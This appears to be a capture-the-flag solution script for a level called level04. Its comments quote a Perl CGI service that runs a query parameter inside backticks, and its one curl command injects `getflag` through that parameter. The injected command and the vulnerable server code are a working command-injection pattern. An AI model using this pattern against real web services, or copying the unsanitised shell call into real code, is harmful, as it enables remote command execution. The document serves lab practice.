#!/bin/sh

# Again we exploit the fact that the level04 file has its setuid set.
# We connect to a running apache2 webserver that serves the level04 file and
# we inject the getflag command into the the backticks using x as a key
# and the `getflag` as a value.

# ~/level04.pl - server's source:
# #!/usr/bin/perl
# # localhost:4747
# use CGI qw{param};
# print "Content-type: text/html\n\n";
# sub x {
#   $y = $_[0];
#     print `echo $y 2>&1`;
# }
# x(param("x"));

curl 'localhost:4747?x=`getflag`'
